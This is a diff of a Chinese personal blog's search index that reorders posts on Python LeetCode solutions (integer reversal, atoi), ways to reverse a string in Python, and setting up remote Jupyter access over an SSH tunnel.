(<span class="number">1</span>&lt;&lt;<span class="number">31</span>) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> y!=<span class="number">0</span>:</span><br><span class="line">            ans = ans*<span class="number">10</span> + y%<span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> ans &gt; boundry:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            y //= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> ans <span class="keyword">if</span> x&gt;<span class="number">0</span> <span class="keyword">else</span> -ans</span><br></pre></td></tr></table></figure>
+<p>另外利用移位可以很容易表示一个很大的边界值。</p>
+<h5 id="解法2-转化为字符串"><a href="#解法2-转化为字符串" class="headerlink" title="解法2: 转化为字符串"></a>解法2: 转化为字符串</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">-10</span>&lt;x&lt;<span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        str_x = str(x)</span><br><span class="line">        boundry = <span class="number">1</span>&lt;&lt;<span class="number">31</span> <span class="keyword">if</span> x&lt;<span class="number">0</span> <span class="keyword">else</span> (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> x&gt;<span class="number">0</span>:</span><br><span class="line">            temp = str_x[::<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = str_x[:<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line">        ans = int(temp)</span><br><span class="line">        <span class="keyword">if</span> ans&gt;boundry:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> ans <span class="keyword">if</span> x&gt;<span class="number">0</span> <span class="keyword">else</span> -ans</span><br></pre></td></tr></table></figure>
+<h2 id="在这里再次提醒自己熟悉一下python字符串的切片功能。"><a href="#在这里再次提醒自己熟悉一下python字符串的切片功能。" class="headerlink" title="在这里再次提醒自己熟悉一下python字符串的切片功能。"></a>在这里再次提醒自己熟悉一下python字符串的切片功能。</h2><h3 id="8-字符串转换整数-atoi-（中等）"><a href="#8-字符串转换整数-atoi-（中等）" class="headerlink" title="8. 字符串转换整数(atoi)（中等）"></a>8. 字符串转换整数(atoi)（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>请你来实现一个 atoi 函数，使其能将字符串转换成整数。<br>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。<br>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。<br>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。<br>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。<br>在任何情况下，若函数不能进行有效的转换时，请返回0。</p>
+<h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;42&quot;</span><br><span class="line">输出: 42</span><br></pre></td></tr></table></figure>
+<h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;   -42&quot;</span><br><span class="line">输出: -42</span><br><span class="line">解释: 第一个非空白字符为 &apos;-&apos;, 它是一个负号。</span><br><span class="line">     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。</span><br></pre></td></tr></table></figure>
+<h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;4193 with words&quot;</span><br><span class="line">输出: 4193</span><br><span class="line">解释: 转换截止于数字 &apos;3&apos; ，因为它的下一个字符不为数字。</span><br></pre></td></tr></table></figure>
+<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;words and 987&quot;</span><br><span class="line">输出: 0</span><br><span class="line">解释: 第一个非空字符是 &apos;w&apos;, 但它不是数字或正、负号。</span><br><span class="line">     因此无法执行有效的转换。</span><br></pre></td></tr></table></figure>
+<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;-91283472332&quot;</span><br><span class="line">输出: -2147483648</span><br><span class="line">解释: 数字 &quot;-91283472332&quot; 超过 32 位有符号整数范围。 </span><br><span class="line">     因此返回 INT_MIN (−231) 。</span><br></pre></td></tr></table></figure>
+<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这道题可以利用正则表达式，一行代码就可以解决。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> max(min(int(*re.findall(<span class="string">r'^[\+\-]?\d+'</span>, str.lstrip())), (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span>), -(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的是，因为<code>re.findall()</code>返回的是个列表，因此调用<code>int()</code>方法转化为整数的时候需要前面加一个<code>*</code>。<br>这道题也提醒我该去好好看看正则表达式了…</p>
+]]></content>
+      <categories>
+        <category>LeetCode系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>LeetCode DAY 4 (6)</title>
     <url>/2020/01/13/leetcode-day4/</url>
     <content><![CDATA[<p>嘿！大家好，懒狗又要开始更新Leetcode咯！<a id="more"></a></p>
@@ -705,32 +731,6 @@
 
 
 
-]]></content>
-      <categories>
-        <category>LeetCode系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>LeetCode DAY 5 (7-8)</title>
-    <url>/2020/01/14/leetcode-day5/</url>
-    <content><![CDATA[<p>虽然打了一下午的游戏，但懒狗不会忘记刷题的！<a id="more"></a></p>
-<h3 id="7-整数反转（简单）"><a href="#7-整数反转（简单）" class="headerlink" title="7. 整数反转（简单）"></a>7. 整数反转（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
-<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure>
-<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure>
-<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：弹出和推入数字-amp-溢出前进行检查"><a href="#解法1：弹出和推入数字-amp-溢出前进行检查" class="headerlink" title="解法1：弹出和推入数字 &amp; 溢出前进行检查"></a>解法1：弹出和推入数字 &amp; 溢出前进行检查</h5><p>取出一位数字很显然用到<code>%</code>，之后需要用<code>//</code>将取出的一位数字从原数值中删去。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        y, ans = abs(x), <span class="number">0</span></span><br><span class="line">        <span class="comment"># 边界</span></span><br><span class="line">        boundry = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) <span class="keyword">if</span> x&lt;<span class="number">0</span> <span class="keyword">else</span> (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> y!=<span class="number">0</span>:</span><br><span class="line">            ans = ans*<span class="number">10</span> + y%<span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> ans &gt; boundry:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            y //= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> ans <span class="keyword">if</span> x&gt;<span class="number">0</span> <span class="keyword">else</span> -ans</span><br></pre></td></tr></table></figure>
-<p>另外利用移位可以很容易表示一个很大的边界值。</p>
-<h5 id="解法2-转化为字符串"><a href="#解法2-转化为字符串" class="headerlink" title="解法2: 转化为字符串"></a>解法2: 转化为字符串</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">-10</span>&lt;x&lt;<span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        str_x = str(x)</span><br><span class="line">        boundry = <span class="number">1</span>&lt;&lt;<span class="number">31</span> <span class="keyword">if</span> x&lt;<span class="number">0</span> <span class="keyword">else</span> (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> x&gt;<span class="number">0</span>:</span><br><span class="line">            temp = str_x[::<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = str_x[:<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line">        ans = int(temp)</span><br><span class="line">        <span class="keyword">if</span> ans&gt;boundry:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> ans <span class="keyword">if</span> x&gt;<span class="number">0</span> <span class="keyword">else</span> -ans</span><br></pre></td></tr></table></figure>
-<h2 id="在这里再次提醒自己熟悉一下python字符串的切片功能。"><a href="#在这里再次提醒自己熟悉一下python字符串的切片功能。" class="headerlink" title="在这里再次提醒自己熟悉一下python字符串的切片功能。"></a>在这里再次提醒自己熟悉一下python字符串的切片功能。</h2><h3 id="8-字符串转换整数-atoi-（中等）"><a href="#8-字符串转换整数-atoi-（中等）" class="headerlink" title="8. 字符串转换整数(atoi)（中等）"></a>8. 字符串转换整数(atoi)（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>请你来实现一个 atoi 函数，使其能将字符串转换成整数。<br>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。<br>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。<br>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。<br>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。<br>在任何情况下，若函数不能进行有效的转换时，请返回0。</p>
-<h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;42&quot;</span><br><span class="line">输出: 42</span><br></pre></td></tr></table></figure>
-<h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;   -42&quot;</span><br><span class="line">输出: -42</span><br><span class="line">解释: 第一个非空白字符为 &apos;-&apos;, 它是一个负号。</span><br><span class="line">     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。</span><br></pre></td></tr></table></figure>
-<h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;4193 with words&quot;</span><br><span class="line">输出: 4193</span><br><span class="line">解释: 转换截止于数字 &apos;3&apos; ，因为它的下一个字符不为数字。</span><br></pre></td></tr></table></figure>
-<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;words and 987&quot;</span><br><span class="line">输出: 0</span><br><span class="line">解释: 第一个非空字符是 &apos;w&apos;, 但它不是数字或正、负号。</span><br><span class="line">     因此无法执行有效的转换。</span><br></pre></td></tr></table></figure>
-<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;-91283472332&quot;</span><br><span class="line">输出: -2147483648</span><br><span class="line">解释: 数字 &quot;-91283472332&quot; 超过 32 位有符号整数范围。 </span><br><span class="line">     因此返回 INT_MIN (−231) 。</span><br></pre></td></tr></table></figure>
-<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这道题可以利用正则表达式，一行代码就可以解决。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> max(min(int(*re.findall(<span class="string">r'^[\+\-]?\d+'</span>, str.lstrip())), (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span>), -(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))</span><br></pre></td></tr></table></figure>
-<p>这里需要注意的是，因为<code>re.findall()</code>返回的是个列表，因此调用<code>int()</code>方法转化为整数的时候需要前面加一个<code>*</code>。<br>这道题也提醒我该去好好看看正则表达式了…</p>
 ]]></content>
       <categories>
         <category>LeetCode系列</category>
@@ -899,28 +899,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Python实现字符串反转的几种方法</title>
-    <url>/2019/11/15/py-str-reverse/</url>
-    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
-<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'abcdefg'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = s[::<span class="number">-1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">'g'</span>, <span class="string">'f'</span>, <span class="string">'e'</span>, <span class="string">'d'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = <span class="string">''</span>.join(l[::<span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
-<p>同理，可以用<code>&#39;&#39;.join(l[::-1])</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = <span class="string">''</span>.join(l[::<span class="number">-1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
-<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'abcdefg'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = reduce(<span class="keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
-<p>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
-<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(s) == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> s</span><br><span class="line">	<span class="keyword">return</span> func(s[<span class="number">1</span>:]) + s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure>
-<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="string">''</span></span><br><span class="line">	<span class="keyword">while</span> len(l)&gt;<span class="number">0</span>:</span><br><span class="line">		<span class="comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure>
-<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(s)</span>:</span></span><br><span class="line">	ans = <span class="string">''</span></span><br><span class="line">	max_index = len(s) - <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure>
-<p>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(l):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="number">2</span>, <span class="number">3</span></span><br><span class="line"><span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="number">4</span>, <span class="number">5</span></span><br><span class="line"><span class="number">5</span>, <span class="number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
-<hr>
-<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>服务器配置jupyter notebook实现远程访问</title>
     <url>/2019/12/14/remote-jupyternotebook/</url>
     <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
@@ -982,6 +960,28 @@
 <p>必须加上-g参数，以保证host1能使用host3建立的远程端口转发，加上-g参数就代表可以共享这个连接的意思。<br>按下ctrl+A+D可以从screen命令返回。<br>之后在自己的笔记本上，也就是host1上（可以用手机开热点模拟在家的情况）</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 1234:localhost:12345 host2</span><br></pre></td></tr></table></figure>
 <p>好了最后笔记本上的terminal不要关掉哦，不然这个SSH隧道就断了哦。<br>现在我们在笔记本上的浏览器中输入：localhost:1234<br>是不是打开了在实验室的服务器上开启的jupyter服务呢。</p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Python实现字符串反转的几种方法</title>
+    <url>/2019/11/15/py-str-reverse/</url>
+    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
+<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'abcdefg'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = s[::<span class="number">-1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">'g'</span>, <span class="string">'f'</span>, <span class="string">'e'</span>, <span class="string">'d'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = <span class="string">''</span>.join(l[::<span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
+<p>同理，可以用<code>&#39;&#39;.join(l[::-1])</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = <span class="string">''</span>.join(l[::<span class="number">-1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'abcdefg'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = reduce(<span class="keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'gfedcba'</span></span><br></pre></td></tr></table></figure>
+<p>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
+<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(s) == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> s</span><br><span class="line">	<span class="keyword">return</span> func(s[<span class="number">1</span>:]) + s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure>
+<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="string">''</span></span><br><span class="line">	<span class="keyword">while</span> len(l)&gt;<span class="number">0</span>:</span><br><span class="line">		<span class="comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure>
